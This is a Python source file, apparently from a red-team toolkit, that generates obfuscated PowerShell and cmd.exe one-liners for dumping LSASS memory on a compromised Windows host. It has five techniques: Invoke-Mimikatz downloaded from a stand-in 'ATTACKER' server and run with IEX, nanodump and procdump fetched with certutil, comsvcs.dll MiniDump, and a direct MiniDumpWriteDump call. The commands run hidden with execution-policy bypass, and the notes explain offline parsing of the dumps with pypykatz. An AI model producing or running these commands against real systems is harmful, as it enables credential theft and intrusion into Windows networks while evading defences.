"""
LSASS / credential harvest template generator.
Returns obfuscated PowerShell and cmd.exe one-liners for dumping LSASS memory
from a compromised Windows host. For use in authorized red team exercises only.
"""
import random
import string
from dataclasses import dataclass

from .obfuscate import ps_tick_marks

SUPPORTED_TECHNIQUES = (
    "mimikatz_invoke",
    "nanodump",
    "comsvcs_minidump",
    "procdump",
    "lsass_dump_ps",
)


@dataclass
class HarvestResult:
    command: str
    technique: str
    notes: str


def _rand_var(length: int = 4) -> str:
    return "$" + random.choice(string.ascii_lowercase) + "".join(
        random.choices(string.ascii_lowercase + string.digits, k=length - 1)
    )


# ── Techniques ────────────────────────────────────────────────────────────────

def _mimikatz_invoke(outfile: str, obfuscate: bool) -> HarvestResult:
    url_var = _rand_var()
    cmd_var = _rand_var()
    url = "https://ATTACKER/Invoke-Mimikatz.ps1"
    invoke = f"Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"' | Out-File -Encoding ASCII {outfile}"
    cmd = f"{url_var}='{url}';{cmd_var}=(New-Object Net.WebClient).DownloadString({url_var});IEX {cmd_var};{invoke}"
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return HarvestResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="mimikatz_invoke",
        notes=(
            "Replace ATTACKER with your staging server hosting Invoke-Mimikatz.ps1. "
            "Requires local admin. Output written to " + outfile
        ),
    )


def _certutil_exec(url: str, tmp_exe: str, run_cmd: str) -> str:
    dl = f"certutil -urlcache -split -f {url} {tmp_exe}"
    cleanup = f"del /f /q {tmp_exe}"
    return f"{dl} && {run_cmd} && {cleanup}"


def _nanodump(outfile: str, obfuscate: bool) -> HarvestResult:
    tmp = "C:\\Windows\\Temp\\nd.exe"
    cmd = _certutil_exec(
        "https://ATTACKER/nanodump.exe",
        tmp,
        f"{tmp} --write {outfile} --valid",
    )
    return HarvestResult(
        command=cmd,
        technique="nanodump",
        notes=(
            "Replace ATTACKER with your staging server hosting nanodump.exe. "
            "LSASS minidump written to " + outfile + ". "
            "Parse offline with: pypykatz lsa minidump " + outfile
        ),
    )


def _comsvcs_minidump(outfile: str, obfuscate: bool) -> HarvestResult:
    pid_var = _rand_var()
    dump_cmd = (
        f"{pid_var}=(Get-Process lsass).Id;"
        # MiniDump ordinal (not export name) required on non-English Windows — use comsvcs,MiniDump not #4
        f"rundll32 C:\\Windows\\System32\\comsvcs.dll,MiniDump {pid_var} {outfile} full"
    )
    if obfuscate:
        dump_cmd = ps_tick_marks(dump_cmd)
    return HarvestResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{dump_cmd}\"",
        technique="comsvcs_minidump",
        notes=(
            "Requires local admin and 64-bit PowerShell. "
            "comsvcs.dll MiniDump writes LSASS to " + outfile + ". "
            "Parse with: pypykatz lsa minidump " + outfile
        ),
    )


def _procdump(outfile: str, obfuscate: bool) -> HarvestResult:
    tmp = "C:\\Windows\\Temp\\pd.exe"
    cmd = _certutil_exec(
        "https://ATTACKER/procdump.exe",
        tmp,
        f"{tmp} -accepteula -ma lsass.exe {outfile}",
    )
    return HarvestResult(
        command=cmd,
        technique="procdump",
        notes=(
            "Replace ATTACKER with your staging server hosting procdump.exe (Sysinternals). "
            "Minidump written to " + outfile + ". "
            "Parse with: pypykatz lsa minidump " + outfile
        ),
    )


def _lsass_dump_ps(outfile: str, obfuscate: bool) -> HarvestResult:
    pid_var = _rand_var()
    handle_var = _rand_var()
    stream_var = _rand_var()
    code = (
        f"Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(int a,bool b,int c);' -Name K32 -Namespace W;"
        f"Add-Type -MemberDefinition '[DllImport(\"dbghelp.dll\")]public static extern bool MiniDumpWriteDump(IntPtr a,int b,IntPtr c,int d,IntPtr e,IntPtr f,IntPtr g);' -Name Dbg -Namespace W;"
        f"{pid_var}=(Get-Process lsass).Id;"
        f"{handle_var}=[W.K32]::OpenProcess(0x1FFFFF,$false,{pid_var});"
        f"{stream_var}=[System.IO.File]::Create('{outfile}');"
        f"[W.Dbg]::MiniDumpWriteDump({handle_var},{pid_var},{stream_var}.SafeFileHandle.DangerousGetHandle(),2,0,0,0);"
        f"{stream_var}.Close()"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return HarvestResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="lsass_dump_ps",
        notes=(
            "Pure-PowerShell LSASS dump via MiniDumpWriteDump reflection. "
            "No binary download required. Requires local admin. "
            "Minidump written to " + outfile + ". "
            "Parse with: pypykatz lsa minidump " + outfile
        ),
    )


# ── Public API ─────────────────────────────────────────────────────────────────

_DISPATCH = {
    "mimikatz_invoke": _mimikatz_invoke,
    "nanodump": _nanodump,
    "comsvcs_minidump": _comsvcs_minidump,
    "procdump": _procdump,
    "lsass_dump_ps": _lsass_dump_ps,
}


def generate_harvest(technique: str, outfile: str, obfuscate: bool = True) -> HarvestResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    return _DISPATCH[technique](outfile, obfuscate)
